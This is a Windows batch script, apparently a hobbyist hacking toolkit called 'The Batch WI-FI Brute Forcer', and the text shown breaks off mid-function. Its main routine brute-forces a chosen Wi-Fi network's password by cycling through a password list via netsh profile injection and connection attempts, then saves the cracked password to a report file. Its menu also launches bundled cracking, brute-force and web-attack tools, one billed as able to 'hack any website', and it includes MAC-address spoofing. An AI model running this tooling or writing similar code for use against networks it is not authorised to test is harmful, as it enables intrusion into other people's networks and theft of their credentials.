@echo off
	set allowed_char_list="ABCDEFGHIJKLMNOPRSTUVYZWXQabcdefghijklmnoprstuvyzwxq0123456789-_"
	title The WI-FI Brute Forcer - Developed By TUX -Modified By MORPHEUSLORD 
	set /a attempt=1
	cls
	echo --logedin-->>applog.txt
	date /t datelogedin>> applog.txt
	time /t timelogedin>> applog.txt
	set targetwifi=No WI-FI Selected
	set interface_admin_state=Not Selected
	set interface_registry_location=Not Selected
	set interface_description=Not Selected
	set interface_id=Not Selected
	set interface_mac=Not Selected
	set interface_state=notdefined
	setlocal enabledelayedexpansion
	color 0f
	set program_path=%0
	set program_directory=!program_path:~1,-17!
	set program_drive=!program_directory:~0,2!
	%program_drive%
	cd %program_directory%
	
	:check_Permissions
	net session >nul 2>&1
	if %errorLevel% == 0 (
		set privilege_level=administrator
		cd !current_directory!
		cd BF_Files
		del attempt.xml >nul
		del infogate.xml >nul
		cls

	)else (
		set privilege_level=local
		cd BF_Files
		del attempt.xml >nul
		del infogate.xml >nul
		cls
	)
	
	
	
	
	
	
	
	
	call :interface_detection
	
	
	if !interface_number!==1 (
	echo.
	call colorchar.exe /0b " Interface Detection"
	echo.
	echo.
	call colorchar.exe /0e " Only '1' Interface Found!"
	echo.
	echo.
	call colorchar.exe /0f " !interface_1_description!("
	call colorchar.exe /09 "!interface_1_mac!"
	call colorchar.exe /0f ")"
	echo.
	echo.
	echo  Making !interface_1_description! as default Interface...
	set interface_id=!interface_1_id!
	set interface_description=!interface_1_description!
	set interface_mac=!interface_1_mac!
	pause
	)
	
	if !interface_number! gtr 1 (
	echo.
	call colorchar.exe /0b " Interface Detection"
	echo.
	echo.
	call colorchar.exe /0e " Multiple '!interface_number!' Interfaces Found!"
	echo.
	pause
	call :interface_selection
	
	)
	
	if !interface_number!==0 (
	echo.
	call colorchar.exe /0b " Interface Detection"	
	echo.
	echo.
	call colorchar.exe /0e " WARNING"
	echo.
	echo  No interfaces found on this device^^!
	echo.
	echo  Press any key to continue...
	pause
	cls
	)
	
	
	
	goto :main
	
	
	
	
	
	
	

	
	
	
	
	
	:main
	set mainmenuchoice=
	cls
	echo.
	echo  [-------------------------------------------------------------------------------------------------------------------------------] 
	echo.
	call colorchar.exe /0c "5902640823530041639841562200610474119947955355225151515151552431092316468157283172376171751366318205422812445130121596130784154441
	echo.
	call colorchar.exe /0c "2764812623313251681331743300051798615745305253/98->'TECHNICALUSERX'826522414203137773144235731927137161629668273912677730456545552
	echo.
	call colorchar.exe /0c "26241305682249810201894429473304289399282162404466->'MORPHOUSLORD'5431254396757346656156629438103898654191456455892745326780454555
	echo.
	call colorchar.exe /0c "393165322846317555295618579203209545119701322614374->'TheBATeam'157044762285791921516351537113015233201541041557195247414544555555
	echo.
	call colorchar.exe /0c "3022893824412242292179177172493145192MORPHEUSLOR5254176511753619171921179622765987457041111013503775229155911912589548545644455225
	echo.
	call colorchar.exe /0c "2635057244654194133001273941427281724----------D8305052060313751144219897179432254222520755225715396202182300012349972954545452522
	echo.
	call colorchar.exe /0c "9342827310316652539023959676525516155851---748152540216213310743194818378269601400019563578018233134021087580621905915117546543552
	echo.
	call colorchar.exe /0c "98601414010985165931766123740177022927158--199051362443053244220174320914298181511082110811149982802910960109905059106005376555252
	echo.
	call colorchar.exe /0c "1377511535278952565286562622710709201572715313409441021823401719019931424922199402006810559142182157331402223791646031598202605555
	echo.
	call colorchar.exe /0c "2083227779101821469615851146TECHNICAL21857559856092THE---0873123813277911338559564323391651181203511735095621992749622090654545525
    	echo.
	call colorchar.exe /0c "1799114121184219431128627540------AL421369618089196TEAM--111206324712063221hhtyhtyh544444554| |__ _ _ _  _| |_ ___ 54854444454488t
    	echo.
	call colorchar.exe /0c "17991141211842129431128627540-USERX-42136961808919-BAT----11206324712063221yhyhtyhyh74884854| '_ \ '_| || |  _/ -_)548648548845484
    	echo.
	call colorchar.exe /0c "1799114121184219431128627540------6421369618089196-------11206324712063221yhtyhtyhyt74745544|_.__/_|  \_,_|\__\___|586488548484868
    	echo.
	call colorchar.exe /0c "17991141211842194311286275401097296421369----89196762308111206324712063221yhtyhyht45448648ki__54565515444445545455485484854545thth
    	echo.
	call colorchar.exe /0c "17991141211842194311286275401097296421369----89196762308111206324712063221yhtyhythyhh858452/ _|___ _ _ __ ___ _ _ 54854564545556gt
    	echo.
	call colorchar.exe /0c "17991141211842194311286275401097296421369----89196762308111206324712063221hythtyhyhyh554546|  _/ _ \ '_/ _/ -_) '_|515565625555555
    	echo.
	call colorchar.exe /0c "17991141211842194311286275401097296-----------9196762308111206324712063221hyhtyyh8646855445|_| \___/_| \__\___|_|525444544445556tt
	echo.
	call colorchar.exe /0c "17991141211842194311286275401097296-------------9676230811120632471206322109381892192821246212211296924420301556848311188591555525
	echo.
	call colorchar.exe /0c "5119570730659314106797946023560141752287030318310653083124664171671171620110156512546211127120261140529282255796075287112935412552
	echo.
	call colorchar.exe /0c "1393126599232801671835731181627336363417735298223933788753262727025913256984668154221400282162255865692157728631801615454444455255
	echo.	
	call colorchar.exe /0c "7462174618553202111712821452461379684401237492786111202886729891210053778270321489010601277046098201512887243527893430545451554455
	echo.
	call colorchar.exe /0c "2266324161443616361243341571531177241461733631220144929243278071218314583112442150036962632810053979020742246471219716251619955474
	echo.
	call colorchar.exe /0c "3863271921849120715153282570213633841145356271590414327794767741918729487101361342715181234092614710529245452655255615551545155555
	
	call colorbox.exe /0d 25 9 39 16
	call colorbox.exe /0b 34 14 48 21
	call colorbox.exe /0c 34 4 48 11
	call colorbox.exe /0d 43 9 57 16
	call colorbox.exe /0b 26 10 40 17
	call colorbox.exe /0c 35 15 49 22
	call colorbox.exe /0d 35 5 49 12
	call colorbox.exe /0b 44 10 58 17
	call colorbox.exe /0c 27 11 41 18
	call colorbox.exe /0d 36 16 50 23
	call colorbox.exe /0b 36 6 50 13
	call colorbox.exe /0c 45 11 59 18
	echo.
	echo  [-------------------------------------------------------------------------------------------------------------------------------]
	call colorchar.exe /0b "                              THE BATCH WI-FI BRUTE FORCER (Version 1.2.0)"
	echo.
	call colorchar.exe /0e "                   Developed By TUX      Modified By MORPHEUSLORD      Plugins By TheBATeam"
	echo.
	echo.



	call colorchar.exe /0b "   Target - "
	echo !targetwifi!
	call colorchar.exe /0b "   Interface - "
	echo !interface_description!
	echo.
	echo    Type "help" for more info

	call colorbox.exe /0F 1 29 104 35
	echo.
	echo.
	call :userinput
	set /p mainmenuchoice=

	if !mainmenuchoice!==exit (
	exit
	)


	if !mainmenuchoice!==test (
	cls
	echo.
	echo  ID !interface_id!
	echo  MAC !interface_mac!
	echo  DESC !interface_description!
	echo.
	pause
	cls
	goto :main
	)



	if !mainmenuchoice!==help (
		cls
		echo.
		call colorchar.exe /0j " Help Page"
		echo.
		echo.
		echo  - help             : Prints this page                      - gitcmd           : git for windows
		echo  - wifiscan         : Performs a WI-FI scan                 - gitbash          : bash for windows
		echo  - interface        : Open Interface Management             - aircrack-ng      : use aircrack-ng
		echo  - attack           : Attacks on selected WI-FI             - vega             : web scanner 
		echo  - utility          : other utility                         - ncat             : capture tool
		echo  - putty            : ssh and telnet server device          - zap              : owasp zap tool
		echo  - aircrack-ng-gui  : aircrack graphical user interface     - thc-hydra        : bruteforcer tool
		echo  - networkmanager   : track network and manage network      - subbrute         : web application
		echo  - hashcat          : hashcat for windows 64 bit            - sslscan          : scans ssl server
		echo  - hashcat32        : hashcat for windows 32 bit            - exiftool         : collects exif data
		echo  - burpsuite        : using burpsuite                       - processhacker    : process monitoring tool
		echo  - wireshark        : wireshark for wifi hacking and capturing
		echo  - andriodbug       : andriod apk debugging tool
		echo  - ipscanner        : ip port scanner 
		echo  - atom             : text editor and IDE
		echo  - hatch            : website bruteforcer
		echo  - pureblood        : additional hacking framework
		echo  - sqitedatabase    : sql database
		echo  - rainbowcrack     : crackes rainbowtable
		echo  - omphcrack        : password cracking tool 
		echo  - nmap             : port scanner
		echo  - sherlock         : collects username information
		echo  - investigo        : investigation tool for username similar to sherlock
		echo  - testsslserver    : testes for the ssl server
		echo  - wpscan           : url scanner 
		echo.
		echo  For more informaton, please read the file
		colorchar.exe /a " readme.txt"
		echo.
		echo.
		echo  Other projects of TUX:
		colorchar.exe /a " https://www.bytechonline.wordpress.com"
		echo.
		echo  other projects by MORPHEUSLORD
		colorchar.exe /e  " github :- morpheuslord"
		colorchar.exe /b  " / passinfo.cmd"
		echo.
		echo  This project's UI has made possible with TheBATeam group plugins.
		colorchar.exe /6  " https://www.thebateam.org/"
		echo.
		echo  box design's by
		colorchar.exe /A  " MORPHEUSLORD"
		echo.
		echo  utility file design and plugins by
		colorchar.exe /A  " MORPHEUSLORD"
		echo.
		echo  Press any key to continue...
		pause >nul
		cls
		goto :main
	)

	if !mainmenuchoice!==processhacker (
		cd BF_Files
		start ProcessHacker.exe
	)

	if !mainmenuchoice!==zap (
		cd BF_Files
		cd jdk1.8.0_74
		cd bin
		java.exe -jar zap-2.7.0.jar
	)


	if !mainmenuchoice!==hatch (
		cd BF_Files
		cd Python27
		cls
		echo.
		call colorchar.exe /a "ur chromedriver should be the same as ur chrome virsion"
		echo.
		call colorchar.exe /a "u can hack any website using this follow the steps carefully"
		echo.
		python.exe hatch\main.py
	)

	if !mainmenuchoice!==networkminer (
		cd BF_Files
		cd NetworkMiner
		NetworkMiner.exe
	)	

        if !mainmenuchoice!==wpscan (
		cls
		cd BF_Files
		cd ruby
		cd bin
		ruby.exe wpscan.rb --help
                echo.
		call colorchar.exe /0e "please do not mention wpscan before writting ur command"
		echo.
		call colorchar.exe /0a "wpscan is default u can directly write ur code"
		echo.
		call colorchar.exe /0d "use the tool if u know how to use it cause its fast"
		echo.
		set /p command="enter command : "
		ruby.exe wpscan.rb %command%
	)

	if !mainmenuchoice!==exiftool (
		cd BF_Files
		set /p location="enter file location : "
		exiftool.exe %location%
	)

	if !mainmenuchoice!==nmap (
		cd..
		start utile.cmd
	)

	if !mainmenuchoice!==thc-hydra (
		cd..
		start utile.cmd
	)

	if !mainmenuchoice!==testsslserver (
		cd..
		start utile.cmd
	)

	if !mainmenuchoice!==ncat (
		cd..
		start utile.cmd
	)

	if !mainmenuchoice!==investigo (
		cd BF_Files
		investigo.exe
	)

	if !mainmenuchoice!==sslscan (
		cd..
		start utile.cmd
	)


	if !mainmenuchoice!==sherlock (
		cd..
		start utile.cmd
	)

	if !mainmenuchoice!==sqitedatabase (
		cd BF_Files
		cd SQLiteDatabaseBrowser64
		start sqlitebrowser.exe
	)

	if !mainmenuchoice!==omphcrack (
		cd BF_Files
		cd omphcrack
		start omphcrack.exe
	)
	
	if !mainmenuchoice!==atom (
		cd BF_Files
		cd Atom
		start atom.exe
	)

	if !mainmenuchoice!==pureblood (
		cls
		cd pureblood
		penblood.exe
	)


	if !mainmenuchoice!==rainbowcrack (
		cd BF_Files
		cd rainbowcrack
		start rcrack.exe
	)

	if !mainmenuchoice!==subbrute (
		cd..
		start utile.cmd
	)

	if !mainmenuchoice!==vega (
		cd BF_Files
		cd Vega
		start Vega.exe
	)

	if !mainmenuchoice!==hashcat (
		call :hashcat64
	)

	if !mainmenuchoice!==burpsuite (
		cd BF_Files
		cd jdk1.8.0_74
		cd bin
		javaw.exe -jar burpsuite.jar
	)

	if !mainmenuchoice!==androidbug (
		call :androidbug_framework
	)

	if !mainmenuchoice!==wireshark (
		cd BF_Files
		cd Wireshark
		start Wireshark.exe
	)

	if !mainmenuchoice!==ipscanner (
		cd BF_Files
		cd jdk1.8.0_74
		cd bin
		java.exe -jar ipscan.exe
	)

	if !mainmenuchoice!==hashcat32 (
		call :hashcat32
	)

	if !mainmenuchoice!==interface (
		cls
		call :interface_management
		cls
		goto :main
	)

	if !mainmenuchoice!==networkmanager (
		cd BF_Files
		cd NETworkManager
		start NETworkManager.exe
		cls
		goto :main
	)

	if !mainmenuchoice!==aircrack-ng (
		echo.
		colorchar.exe /A  "it will work if ur cap file is valid "
		echo.
		cd aircrack-ng-1.6-win
		cd bin
        	echo cap file
		set /p capfile=
		echo wordlist
		set /p wordlist=
		aircrack-ng.exe %capfile% -w %wordlist%
		cls
		goto :main
	)

	if !mainmenuchoice!==aircrack-ng-gui (
        	echo.
		colorchar.exe /A  "it will work if ur cap file is valid "
		echo.
		cd aircrack-ng-1.6-win
		cd bin
		aircrack-gui.exe
		cls
		goto :main
	)

	if !mainmenuchoice!==gitcmd (
        cls
		cd PortableGit
		git-cmd.exe
		cls
		goto :main
    )

	if !mainmenuchoice!==gitbash (
        cls
		cd PortableGit
		git-bash.exe
		cls
		goto :main
    )


	if !mainmenuchoice!==putty (
	        echo --puttyloged-- >>puttylog.txt
		date /t datelogedin>> puttylog.txt
		time /t timelogedin>> puttylog.txt
		start putty.exe
		cls
		goto :main
	)

	if !mainmenuchoice!==utility (
		start utile
		goto :main
	)

	if !mainmenuchoice!==wifiscan (
		del infogate.xml
		call :wifiscan
		call :exporter !targetwifi!
		goto :main
	)



	if !mainmenuchoice!==hidden (
		cd BF_Files
		cd WifiBF-master
		echo.
		colorchar.exe /A "remmember u need to have python 3.5 or more installed with all the pakages installed"
		echo.
		colorchar.exe /B "requirements.txt file is there in the folder do 'pip install -r requirements.txt '"
		echo.
		colorchar.exe /c "u can change the word list but for now u can use it by typing words.txt"
		echo.
		colorchar.exe /D "u can change it by adding ur fav txt file to the directory"
		python WifiBF.py
		cls
		goto :main
	)



	if !mainmenuchoice!==attack (
	echo --attacklog-->>attacklog.txt
	date /t datelogedin>> attacklog.txt
	time /t timelogedin>> attacklog.txt
	start alert.vbs
	set /a attempt=1

		if "!targetwifi!"=="No WI-FI Selected" (
			call colorchar.exe /0c " Please select a WI-FI..."
			echo.
			echo.
			echo  Press any key to continue...
			pause
			cls
			set mainmenuchoice=
			goto :main
		)

		if "!interface_description!"=="Not Selected" (
			call colorchar.exe /0c " Please select an interface..."
			echo.
			echo.
			echo  Press any key to continue...

			cls
			set mainmenuchoice=
			goto :main
		)



		cls
		echo.
		call colorchar.exe /0e " WARNING"
		echo.
		echo  If you connected a network with this same name "!targetwifi!",
		echo  its profile will be deleted.
		echo.
		echo.
		echo  This app might not find the correct password if the signal strength
		echo  is too low!
		echo.
		echo  A good USB WI-FI antenna is recommended.
		echo.
		echo  Press any key to continue...
		pause >nul
		netsh wlan delete profile !targetwifi! interface="!interface_id!"
		cls
		echo.
		call colorchar.exe /0b " Processing passlist..."
		echo.
		set /a password_number=0
		for /f "tokens=1" %%a in ( passlist.txt ) do (
			set /a password_number=!password_number!+1
		)
		cls






	for /f "tokens=1" %%a in ( passlist.txt ) do (
		set temppass=%%a
		set temp_auth_num=0
		call :finalfunction !temppass!
		netsh wlan add profile filename=attempt.xml >nul
		call :calc_percentage "!attempt!" "!password_number!"
		cls
		echo  [==================================================]
		call colorchar.exe /07 "  Target WI-FI: "
		echo !targetwifi!
		call colorchar.exe /07 "  Total Passwords: "
		call colorchar.exe /0f "!password_number!"
		echo.
		call colorchar.exe /07 "  Percentage: "
		echo  %% !pass_percentage!
		echo  [==================================================]
		call colorchar.exe /0b "  Trying the password -"
		echo  !temppass!
		echo  [==================================================]
		call colorchar.exe /0e "  Attempt -"
		echo  !attempt!
		echo  [==================================================]
		echo   Current State:
		netsh wlan connect name=!targetwifi! interface="!interface_id!" >nul





		for /l %%a in ( 1, 1, 20) do (
			call :find_connection_state
				if !interface_state!==connecting (
				del infogate.xml
				del attempt.xml
				goto :show_result
			)
				if !interface_state!==connected (
				del infogate.xml
				del attempt.xml
				goto :show_result
			)

		)













		set /a attempt=!attempt!+1
		del attempt.xml
	)


		:Not_Found
		cls
		echo.
		echo  [==================================================]
		call colorchar.exe /0c "  Password not found. :'("
		echo.
		echo  [==================================================]
		echo.
		echo  Press any key to continue...
		pause >nul
		cls

	goto :main
	)


	call colorchar.exe /0c " Invalid input"

	goto :main










	:wifiscan
	set /a keynumber=
	set choice=
	cls

		if "!interface_id!"=="Not Selected" (
		echo.
		call colorchar.exe /0c " You have to select an interface to perform a scan..."
		echo.
		echo.
		echo  Press any key to continue...

		cls
		goto :main

		)


		if !interface_number!==0 (
		echo.
		call colorchar.exe /0c " You have at least '1' WI-FI interface to perform a scan..."
		echo.
		echo.
		echo  Press any key to continue...

		cls
		goto :main

		)


		:test_connection
		set interface_state_check=false

			for /f "tokens=1-5" %%a in ('netsh wlan show interfaces ^| findstr /L "Name State"') do (

			if !interface_state_check!==true (
				set interface_state=%%c
				goto :skip_test_connection
			)

			if "!interface_id!"=="%%c" (
				set interface_state_check=true
			)

			if "!interface_id!"=="%%c %%d" (
				set interface_state_check=true
			)
		)

		:skip_test_connection
		if !interface_state!==connected (
			echo.
			echo  Disconnecting from current network...
			netsh wlan disconnect interface="!interface_id!" >nul


		)





		:skip_disconnection
		cls

		del wifilist.txt
		cls
		set /a keynumber=0
		echo.
		call colorchar.exe /0b " Possible WIFI Networks"
		echo.
		echo.
		call colorchar.exe /0f " Using "
		call colorchar.exe /0e "!interface_description!"
		call colorchar.exe /0f " for scanning..."
		echo.
		echo  Low Signal Strength WI-FIs are not recommended
		echo.
		for /f "tokens=1-4" %%a in ('netsh wlan show networks mode^=bssid interface^="!interface_id!" ') do (


			if %%a==SSID (
				set /a keynumber=!keynumber! + 1
				set current_ssid=%%d

				call :character_finder_2 "!current_ssid!"

			)

			if %%a==Signal (
			set current_signal==%%c


				if !text_available!==true (
					call colorchar.exe /08 " !keynumber! - "
					call colorchar.exe /0f "!current_ssid!"
					call colorchar.exe /03 " - !current_signal:~1,5!"
					echo.

					echo !keynumber! - !current_ssid! - !current_signal:~1,4!>>wifilist.txt
					if !keynumber!==24 (
						goto :skip_scan
					)

				)else (
				call colorchar.exe /0e " !keynumber! - "
				call colorchar.exe /0c "Unsupported Char"
				echo.
				echo !keynumber! - Unsupported Char>>wifilist.txt
					if !keynumber!==24 (
						goto :skip_scan
					)

				)


			)




		)
		:skip_scan
		set /a keynumber=!keynumber!+1
		set choice_cancel=!keynumber!
		call colorchar.exe /08 " !keynumber! - "
		call colorchar.exe /07 "Cancel Selection"


		echo.
		echo.
		call colorchar.exe /0b " Please choice a wifi or cancel(1-!keynumber!)"
		echo.
		set choice=
		call colorchar.exe /0e " wifi"
		call colorchar.exe /0f "@"
		call colorchar.exe /08 "select"
		call colorchar.exe /0f "[]-"
		set /p choice=





		if !choice!==!choice_cancel! (
		set choice=
		set choice_cancel=
		cls
		goto :main
		)



		if !choice! gtr !keynumber! (
			call colorchar.exe /0c " Invalid input"
			echo.

			cls
			set choice=
			goto :skip_disconnection
		)

		if !choice! lss 1 (
			call colorchar.exe /0c " Invalid input"
			echo.

			cls
			set choice=
			goto :skip_disconnection
		)

		for /f "tokens=1-5" %%a in ( wifilist.txt ) do (

		if %%a==!choice! (
				set temp_signal_strength=%%e
				set signal_strength=!temp_signal_strength:~0,-1!
				if %%c==Unsupported (
					call colorchar.exe /0c " This SSID is unsupported..."

					cls
					goto :skip_disconnection
				)else (

					if !signal_strength! lss 50 (
						echo.
						call colorchar.exe /0c " Low signal[!signal_strength!] strengths are not recommended."
						echo.
						echo  Do you want to continue anyway?[Y-N]
						set choice=
						call colorchar.exe /0e " continue"
						call colorchar.exe /0f "@"
						call colorchar.exe /08 "select"
						call colorchar.exe /0f "[]-"
						set /p choice=
							if !choice!==N (
								cls
								goto :skip_disconnection
							)
							if !choice!==Y (
								set targetwifi=%%c
								goto :skip_target_wifi
							)
							call colorchar.exe /0c " Invalid input"
							echo.

							cls
							set choice=
							goto :skip_disconnection

					)



					set targetwifi=%%c
					:skip_target_wifi
					echo Test >nul

				)


			)


		)

		del wifilist.txt
		cls
		goto :eof






	:finalfunction
		for /f "tokens=*" %%x in ( infogate.xml ) do (
		set code=%%x
		echo !code:changethiskey=%1!>>attempt.xml
		)
	goto :eof





	:exporter
		for /f "tokens=*" %%a in ( importwifi.xml ) do (
		set variable=%%a
		echo !variable:changethistitle=%1!>>infogate.xml
	)
	goto :eof








	:userinput
	call colorchar.exe /0a " !privilege_level!"
	call colorchar.exe /0f "@"
	call colorchar.exe /08 "user"
	call colorchar.exe /0f "[]-"
	goto :eof







	:character_finder_2
		set text_available=true
		call :create_string check_name "%~1"
		set /a check_name_length=!check_name_length!-1
		for /l %%a in ( 0,1,!check_name_length!) do (
			set current_character=!check_name:~%%a,1!

			call :character_finder "!allowed_char_list!" "!current_character!"
			if !character_found!==false (
				set text_available=false
				goto :eof
			)

		)
	goto :eof







	:character_finder
	set character_found=false
	call :create_string string_find "%~1"
	set /a string_find_length=!string_find_length! - 1
	for /l %%a in ( 0, 1, !string_find_length! ) do (
		set character=!string_find:~%%a,1!
		if "!character!"=="%~2" (
		set character_found=true
		goto :eof
		)
	)
	goto :eof







	:create_string
		set /a takeaway=4
		set string=%~2
		echo %string%>var.txt

	for /f "useback tokens=*" %%a in ( '%string%' ) do (
		if %string%==%%~a (
			set /a takeaway=2
		)
		set string=%%~a
	)
		set %~1=%string%
		for %%I in ( var.txt ) do (
			set /a %~1_length=%%~zI - %takeaway%
		)
		del var.txt
	goto :eof


















	:interface_detection
	set interface_number=0

		for /f "tokens=1-4" %%a in ('netsh wlan show interfaces ^| findstr /L "Name Description Physical"') do (
			if "%%c"=="Wi-Fi" (

				if "%%d"=="" (
				set /a interface_number=!interface_number!+1
				set interface_!interface_number!_id=%%c
				)else (
				set /a interface_number=!interface_number!+1
				set interface_!interface_number!_id=%%c %%d
				)


			)
			if %%a==Description (
				set interface_!interface_number!_description=%%c %%d
			)
			if %%a==Physical (
				set interface_!interface_number!_mac=%%d
			)
		)
	goto :eof














	:interface_selection
	set interface_choice=
	del interfacelist.txt >nul
	cls
	echo.
	set temp_interface_num_for_selection=1
	call colorchar.exe /0b " Interface Selection"
	echo.
	echo.
	for /l %%a in ( 1, 1, !interface_number! ) do (

		call colorchar.exe /08 " !temp_interface_num_for_selection! - "
		call colorchar.exe /0f "!interface_%%a_description!("
		call colorchar.exe /08 "!interface_%%a_mac!"
		call colorchar.exe /0f ")"
		echo.

		echo !temp_interface_num_for_selection! - !interface_%%a_description! - !interface_%%a_mac!>>interfacelist.txt

		set /a temp_interface_num_for_selection=!temp_interface_num_for_selection!+1
	)
		call colorchar.exe /08 " !temp_interface_num_for_selection! - "
		call colorchar.exe /07 "Cancel Selection"
		echo.
		echo !temp_interface_num_for_selection! - Cancel Selection>>interfacelist.txt
		set choice_cancel=!temp_interface_num_for_selection!



	echo.
	call colorchar.exe /0e " interface"
	call colorchar.exe /0f "@"
	call colorchar.exe /08 "select"
	call colorchar.exe /0f "[]-"
	set /p interface_choice=

		if !interface_choice!==!choice_cancel! (
			goto :eof
		)

		if !interface_choice! gtr !interface_number! (
			call colorchar.exe /0c " Invalid input"
			echo.
			timeout /t 2 >nul
			cls
			set interface_choice=
			goto :interface_selection
		)

		if !interface_choice! lss 1 (
			call colorchar.exe /0c " Invalid input"
			echo.
			timeout /t 2 >nul
			cls
			set interface_choice=
			goto :interface_selection
		)


	for /f "tokens=1-3" %%a in ( interfacelist.txt ) do (

		if !interface_choice!==%%a (
		echo.
		echo.





		set interface_id=!interface_%%a_id!
		set interface_description=!interface_%%a_description!
		set interface_mac=!interface_%%a_mac!
		set targetwifi=No WI-FI Selected


		call colorchar.exe /0f " Setting "
		call colorchar.exe /0e "!interface_description!"
		call colorchar.exe /f " as current interface..."
		timeout /t 3 >nul

		)

	)

	cls
	del interfacelist.txt
	goto :eof





	:show_result
	del WIFI_Report.txt
			cls
			echo  [==================================================]
			call colorchar.exe /0b "  WI-FI Brute Force Results"
			echo.
			echo  [==================================================]
			call colorchar.exe /0f "  SSID: "
			call colorchar.exe /0e "!targetwifi!"
			echo.
			call colorchar.exe /0f "  Password: "
			call colorchar.exe /0a "!temppass!"
			echo.
			call colorchar.exe /0f "  Attempts: "
			call colorchar.exe /09 "!attempt!"
			echo.
			echo  [==================================================]
			echo.
			echo  Attack result has written to WIFI_Report.txt
			call colorbox.exe /0a 0 0 124 7
			call colorbox.exe /0a 1 1 122 8
			call colorbox.exe /0a 2 2 126 9
			echo [------------------------------------]>>WIFI_Report.txt
			echo  WIFI Brute Force Results>>WIFI_Report.txt
			echo [------------------------------------]>>WIFI_Report.txt
			echo  SSID: !targetwifi!>>WIFI_Report.txt
			echo  Password: !temppass!>>WIFI_Report.txt
			echo  Attemps: !attempt!>>WIFI_Report.txt
			echo [------------------------------------]>>WIFI_Report.txt
			echo.
			echo.
			echo  Press any key to exit...
			pause >nul
			exit
	goto :eof







	:find_connection_state
		set interface_state_check=false

			for /f "tokens=1-5" %%a in ('netsh wlan show interfaces ^| findstr /L "Name State"') do (

			if !interface_state_check!==true (
				set interface_state=%%c
				goto :skip_find_connection_state
			)

			if "!interface_id!"=="%%c" (
				set interface_state_check=true
			)

			if "!interface_id!"=="%%c %%d" (
				set interface_state_check=true
			)
		)
	:skip_find_connection_state
		if !interface_state!==associating (
		call colorchar.exe /0g " Associating..."
		echo.
		)
		if !interface_state!==disconnecting (
		call colorchar.exe /0c " Disconnecting..."
		echo.
		)
		if !interface_state!==disconnected (
		call colorchar.exe /04 " Disconnected."
		echo.
		)
		if !interface_state!==authenticating (
		call colorchar.exe /0a " Authenticating..."
		echo.
		)
		if !interface_state!==connecting (
		call colorchar.exe /02 " Connecting..."
		echo.
		)
		if !interface_state!==connected (
		call colorchar.exe /02 " CONNECTED."
		echo.
		)

	goto :eof







	:set_states
		set interface_%1_state=%2
	goto :eof




	:set_states_2
			if "!interface_number!"=="1" (
				set interface_state=!interface_1_state!
			)else (
				echo !interface_id!>interface_id.txt


					for /l %%a in ( 1, 1, 100) do (


						if "!interface_id!" equ "!interface_%%a_id!" (
							set interface_state=!interface_%%a_state!
						)

					)



				del interface_id.txt
			)
	goto :eof

	:calc_percentage
	set /a pass_percentage = (%~1*100)/%~2

	goto :eof





	:mac_randomizer
	set allowed_mac_char_list_obliged=EA26
	set allowed_mac_char_list=123456789ABCDEF

	set set_mac=

	for /l %%a in ( 1,1,12) do (

		if %%a==2 (
			call :index_for_mac_calc_2
			call :set_mac_char_2 !index_for_mac!
		)else (
			call :index_for_mac_calc_1
			call :set_mac_char_1 !index_for_mac!
		)
	)
	goto :eof
	:index_for_mac_calc_1
		set /a index_for_mac=(!random!) %% 15
	goto :eof
	:set_mac_char_1
		set set_mac=!set_mac!!allowed_mac_char_list:~%1,1!
	goto :eof
	:index_for_mac_calc_2
		set /a index_for_mac=(!random!) %% 4
	goto :eof
	:set_mac_char_2
		set set_mac=!set_mac!!allowed_mac_char_list_obliged:~%1,1!
	goto :eof





	:interface_mac_check
		for /f "tokens=1-4" %%a in ( 'wmic nic get name^,macaddress ^| findstr /L "!interface_description!"') do (
			if "!interface_description!"=="%%b %%c" (
			set interface_mac=%%a
			goto :eof
			)

		)
	goto :eof




	:interface_admin_state_check
	for /f "tokens=1-5" %%a in ( ' netsh interface show interface name^="!interface_id!" ' ) do (
		if %%a==Administrative (
			set interface_admin_state=%%c
			goto :eof
		)
	)
	goto :eof






	:interface_registry_check

	for /f "tokens=* skip=7" %%a in ( 'REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}' ) do (


			set current_registry_key=%%a
			set current_registry_interface_description=
			set interface_mac_changed=false

			for /f "tokens=1-10" %%b in ( 'REG QUERY !current_registry_key!' ) do (


				if %%b==DriverDesc (
					set current_registry_interface_description=%%d %%e

				)

				if %%b==NetworkAddress (
					set interface_mac_changed=true

				)

			)
				if "!interface_description!" equ "!current_registry_interface_description!" (
					set interface_registry_location=!current_registry_key!
					goto :eof
				)

	)
	goto :eof






















	:interface_management
	call :interface_admin_state_check
	call :interface_mac_check
	call :interface_registry_check
	:skip_interface_management_check
	cls
	echo.
	call colorchar.exe /0b "  Interface Management"
	echo.
	echo.
	echo.
	call colorchar.exe /0b "   Description: "
	call colorchar.exe /0e "!interface_description!
	echo.
	call colorchar.exe /0b "   Registry Location: "
	call colorchar.exe /0f "!interface_registry_location!"
	echo.
	call colorchar.exe /0b "   MAC Address: "
	call colorchar.exe /08 "!interface_mac!"
	echo.
	call colorchar.exe /0b "   MAC Address Status: "
	if "!interface_description!"=="Not Selected" (
		call colorchar.exe /0f "Not Selected"
		goto :skip_mac_address_status_show
	)
	if "!interface_mac_changed!"=="true" (
		call colorchar.exe /0c "Changed"
	)
	if !interface_mac_changed!==false (
		call colorchar.exe /0a "Original Static Address"
	)
	:skip_mac_address_status_show
	echo.
	call colorchar.exe /0b "   ID: "
	call colorchar.exe /0f "!interface_id!"
	echo.
	call colorchar.exe /0b "   Interface Status: "
	if "!interface_description!"=="Not Selected" (
		call colorchar.exe /0f "Not Selected"
	)
	if !interface_admin_state!==Enabled (
		call colorchar.exe /0a "Enabled"
	)
	if !interface_admin_state!==Disabled (
		call colorchar.exe /0c "Disabled"
	)
	echo.
	echo.
	echo.
	echo  [--------------------------------------------------------------------------------------------------------------------------]
	call colorchar.exe /0b "    Interafe Management Commands"
	echo.
	echo.
	echo    - select interface              : Choose another interface
	echo    - macspoof                      : Perform MAC Spoofing (Administrator Privileges)
	echo    - exit                          : Exits Interface Management
	echo.
	echo  [--------------------------------------------------------------------------------------------------------------------------]
	echo.
	call colorbox.exe /0a 1 3 125 10
	call colorbox.exe /0a 0 2 126 11
	call colorbox.exe /0a 0 1 124 9

	call :userinput
	set /p interfacemanagementchoice=

	if !interfacemanagementchoice!==exit (
	set interfacemanagementchoice=
	cls
	goto :main
	)

	if "!interfacemanagementchoice!"=="select interface" (
	call :interface_detection
	call :interface_selection
	cls
	set interfacemanagementchoice=
	goto :interface_management

	)


	if "!interfacemanagementchoice!"=="macspoof" (
		if "!interface_description!"=="Not Selected" (
			echo.
